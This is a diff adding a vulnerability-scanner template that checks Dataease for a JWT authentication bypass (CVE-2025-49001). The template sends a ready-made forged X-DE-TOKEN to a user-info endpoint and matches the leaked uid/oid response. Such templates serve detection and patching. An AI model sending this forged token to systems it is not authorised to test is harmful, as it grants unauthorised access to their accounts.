@@ -1,0 +1,40 @@
+id: dataease-jwt-bypass
+
+info:
+  name: Dataease JWT Authentication Bypass (CVE-2025-49001)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for a vulnerability in Dataease (CVE-2025-49001), where JWT authentication can be bypassed using a crafted token.
+  tags: authentication,bypass
+  reference:
+    - https://example.com/reference
+
+http:
+  - raw:
+      - |
+        GET /de2api/user/info HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+        Accept-Encoding: gzip, deflate
+        Accept: application/json, text/plain, */*
+        Connection: close
+        out_auth_platform: default
+        X-DE-TOKEN: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjEsIm9pZCI6MX0.a5QYOfZDYlhAy-zUMYzKBBvCUs1ogZhjwKV5SBTECt8
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "uid"
+          - "oid"
+
+      - type: regex
+        part: body
+        regex:
+          - "\\{\\\"uid\\\":\\d+,\\\"oid\\\":\\d+}"
